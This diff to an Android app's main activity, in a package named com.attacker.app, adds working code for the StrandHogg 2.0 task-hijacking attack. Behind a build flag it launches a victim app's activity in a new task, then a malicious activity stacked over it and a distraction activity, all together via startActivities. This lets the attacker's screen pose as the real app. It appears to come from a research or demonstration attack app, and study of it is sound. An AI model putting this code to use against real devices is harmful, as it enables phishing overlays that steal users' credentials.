@@ -13,13 +13,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.content.pm.PermissionInfo;
 import android.os.Bundle;
 import android.os.Process;
 import android.provider.Settings;
 import android.util.Log;
 
 import com.attacker.app.service.AttackerService;
+import com.attacker.app.strandhogg.DistractionActivity;
+import com.attacker.app.strandhogg.MaliciousActivity;
 
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -165,6 +166,29 @@ public class MainActivity extends AppCompatActivity {
 
         if (BuildConfig.ENABLE_ATTACKER_SERVICE && !isMyServiceRunning(serv)) {
             startService(new Intent(this, AttackerService.class));
+        }
+
+        // Attack only works for Android 9 and below
+        if(BuildConfig.STRANDHOGG_TWO_ATTACK){
+            Intent intent1 = new Intent();
+            Intent intent2 = new Intent();
+            Intent intent3 = new Intent();
+
+            // Intent 1: The first victim activity, add FLAG_ACTIVITY_NEW_TASK flag
+            intent1.setClassName(BuildConfig.TARGET_PACKAGE_NAME, BuildConfig.TARGET_ACTIVITY);
+            intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+            //  Intent 2: An attacker activity for the first victim activity, no extra flag
+            intent2.setClass(this, MaliciousActivity.class);
+
+            // Intent 3: The activity with some normal features, add FLAG_ACTIVITY_NEW_TASK flag
+            intent3.setClass(this, DistractionActivity.class);
+            intent3.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+            Intent[] intents = new Intent[]{
+                    intent1, intent2, intent3
+            };
+            startActivities(intents);
         }
 
         // Close Main Activity
